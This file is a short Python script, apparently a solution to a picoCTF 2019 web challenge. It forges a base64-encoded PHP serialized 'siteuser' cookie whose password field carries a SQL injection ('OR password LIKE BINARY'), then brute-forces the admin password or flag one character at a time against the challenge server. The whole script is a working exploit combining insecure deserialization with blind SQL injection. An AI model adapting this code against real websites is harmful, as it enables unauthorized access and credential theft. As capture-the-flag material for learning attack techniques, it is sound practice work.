import requests
import string
import base64


def try_pwd(password):
    print("Testing: {}".format(password))
    injection = "' OR password LIKE BINARY '{}%".format(password)
    payload = 'O:8:"siteuser":2:{{s:8:"username";s:5:"admin";s:8:"password";s:{}:"{}";}}'.format(
        len(injection), injection
    ).encode(
        "utf-8"
    )
    cookies = dict(user_info=base64.b64encode(payload).decode("utf-8"))
    r = requests.get(
        "https://2019shell1.picoctf.com/problem/62195/index.php?file=admin",
        cookies=cookies,
    )
    return "Welcome" in r.text


alpha = string.digits + string.ascii_letters + "{}"

flag = ""
while True:
    for c in alpha:
        if try_pwd(flag + c):
            flag += c
            print("Match: {}".format(flag))
            break
    else:
        break

print("Flag: {}".format(flag))
